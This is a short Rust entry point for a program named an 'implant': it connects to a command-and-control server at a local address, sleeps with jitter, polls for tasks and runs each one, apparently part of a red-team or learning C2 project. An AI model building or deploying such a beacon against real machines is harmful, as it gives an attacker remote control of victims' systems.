use std::time::Duration;

use anyhow::Result;
use tokio::time;

use implant::Implant;

mod implant;

#[tokio::main]
async fn main() -> Result<()> {
    let mut implant = Implant::connect("http://[::1]:50055").await?;

    loop {
        time::sleep(Duration::from_millis(implant.jitter())).await;

        if let Some(task) = implant.poll().await? {
            println!("Task: {:?}", task);
            implant.cmd(task).await?;
        }
    }
}
